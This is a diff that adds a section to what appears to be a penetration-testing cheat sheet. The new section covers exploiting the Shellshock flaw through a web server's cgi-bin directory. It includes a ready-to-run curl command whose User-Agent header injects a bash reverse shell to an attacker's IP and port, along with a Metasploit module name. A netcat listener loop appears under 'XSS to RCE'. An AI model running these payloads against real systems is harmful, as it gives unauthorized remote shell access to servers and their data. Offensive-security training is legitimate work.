@@ -441,6 +441,20 @@ https://github.com/intrudir/403fuzzer <br />
 
 `python3 403fuzzer.py -hc 403 -u http://<ip>/page_that_you_want_to_bypass(which is usally a 403 foribben)`
 
+### Cgi-bin
+
+If we find `cgi-bin` directory which exists on the web server it's good to fuzz for files in that directory and we find we can abuse this which is known as shell shock vulnerability to run bash commands on the web server through this application <br/>
+
+#### Manually 
+
+```bash
+curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/IP/PORT 0>&1' http://Remote IP/cgi-bin/file
+``` 
+
+#### Using Metasploit
+
+`use multi/http/apache_mod_cgi_bash_env_exec`
+
 ### XSS to RCE
 ```
 Attacker: while :; do printf "j$ "; read c; echo $c | nc -lp PORT >/dev/null; done
